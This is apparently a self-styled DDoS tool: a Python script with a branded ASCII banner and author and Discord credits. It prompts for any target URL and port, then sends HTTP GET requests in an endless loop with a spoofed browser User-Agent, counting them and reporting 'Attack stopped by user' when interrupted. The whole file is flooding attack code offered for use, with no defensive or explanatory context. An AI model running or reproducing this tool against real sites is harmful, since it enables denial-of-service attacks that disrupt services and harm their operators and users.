import socket
import random
import requests
from pystyle import Center, Colorate, Colors, Anime
from colorama import Fore
import os

os.system('cls')
print(Colorate.Horizontal(Colors.blue_to_cyan,""" 
 /$$$$$$$  /$$$$$$$$ /$$       /$$   /$$  /$$$$$$   /$$$$$$ 
| $$__  $$| $$_____/| $$      | $$  | $$ /$$__  $$ /$$__  $$ 
| $$  \ $$| $$      | $$      | $$  | $$| $$  \__/| $$  \ $$ 
| $$$$$$$ | $$$$$   | $$      | $$  | $$| $$ /$$$$| $$$$$$$$ 
| $$__  $$| $$__/   | $$      | $$  | $$| $$|_  $$| $$__  $$ 
| $$  \ $$| $$      | $$      | $$  | $$| $$  \ $$| $$  \ $$ 
| $$$$$$$/| $$$$$$$$| $$$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$ 
|_______/ |________/|________/ \______/  \______/ |__/  |__/ 

                ┏━━━━━━━━━━━━━━━━━━━━━┓ 
                ┃  Author : Ego/xhe   ┃ 
                ┃ Discord: .gg/xxxx   ┃ 
                ┗━━━━━━━━━━━━━━━━━━━━━┛
"""))

dest_ip = input("Target URL (e.g. http://example.com): ")
dest_port = int(input("Port: "))
if not dest_ip.startswith('http'):
    dest_ip = 'http://' + dest_ip

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((dest_ip.replace("http://", ""), dest_port))

request_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    
}

packet_count = 0

try:
    while True:
        try:
            response = requests.get(dest_ip, headers=request_headers)
            packet_count += 1
            print(Colorate.Horizontal(Colors.blue_to_cyan, f"Requests sent: {packet_count}"))
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            break
except KeyboardInterrupt:
    print("\nAttack stopped by user.")
